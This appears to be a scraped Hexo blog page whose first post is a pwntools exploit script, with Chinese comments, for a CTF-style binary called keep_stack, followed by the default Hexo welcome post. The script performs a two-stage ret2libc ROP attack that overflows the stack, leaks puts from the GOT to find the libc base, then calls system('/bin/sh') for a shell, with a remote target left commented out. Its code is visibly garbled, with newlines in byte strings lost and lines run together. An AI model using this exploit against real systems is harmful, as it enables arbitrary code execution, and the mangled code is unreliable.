entry.title: My New Post
entry.content:
#!/usr/bin/env python3
from pwn import *

context.arch = “amd64”
context.os = “linux”
context.log_level = “debug”

elf = ELF(“./keep_stack”, checksec=False)
libc = ELF(“./libc.so.6”, checksec=False)

本地

def start_local():
return process([“./ld-linux-x86-64.so.2”, “./keep_stack”], env={“LD_PRELOAD”: “./libc.so.6”})

远程

def start():
return start_local()
# return remote(“host”, 12345)

OFFSET = 0xA8
POP_RDI_RET = 0x4011E1
RET = 0x4011E2
PUTS_PLT = 0x401090
PUTS_GOT = 0x404120
VULN = 0x4016C8

def send_stage(io, payload, length_words=0x80):
# length 是“索引上限”，需要足够大才能覆盖 RIP
# 0x80 对应最多写到 0x100 偏移，足够覆盖 0xA8
assert len(payload) % 2 == 0
assert b” ” not in payload, “payload 含 0x0a 会被提前截断”

io.recvuntil(b"length: ")io.sendline(str(length_words).encode())io.recvuntil(b"What do you want to say? ")io.send(payload + b"
")

def p64n(x):
return p64(x)

while True:
io = start()

# ---------------- stage 1: leak puts ----------------rop1 = flat(    b"A" * OFFSET,    p64n(POP_RDI_RET),    p64n(PUTS_GOT),    p64n(PUTS_PLT),    p64n(VULN),)# 避免换行截断if b"
" in rop1:    io.close()    continuesend_stage(io, rop1)# 吃掉 input 回显行io.recvuntil(b"input: ")io.recvline()# puts 泄漏行leak_line = io.recvline().rstrip(b"
")leak = u64(leak_line.ljust(8, b"\x00"))log.success(f"leaked puts = {hex(leak)}")libc.address = leak - libc.sym["puts"]system_addr = libc.sym["system"]binsh_addr = next(libc.search(b"/bin/sh\x00"))log.success(f"libc base = {hex(libc.address)}")log.success(f"system    = {hex(system_addr)}")log.success(f"/bin/sh   = {hex(binsh_addr)}")# ---------------- stage 2: system('/bin/sh') ----------------rop2 = flat(    b"B" * OFFSET,    p64n(RET),            # 栈对齐（可选但建议）    p64n(POP_RDI_RET),    p64n(binsh_addr),    p64n(system_addr),)# 如果地址里出现 0x0a，会被这题输入逻辑截断；重开一把即可if b"
" in rop2:    log.warning("stage2 payload has 0x0a, retrying...")    io.close()    continuesend_stage(io, rop2)io.interactive()break

entry.title: Hello World
entry.content:
Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.

Quick Start

Create a new post

More info: Writing

Run server

More info: Server

Generate static files

More info: Generating

Deploy to remote sites

More info: Deployment
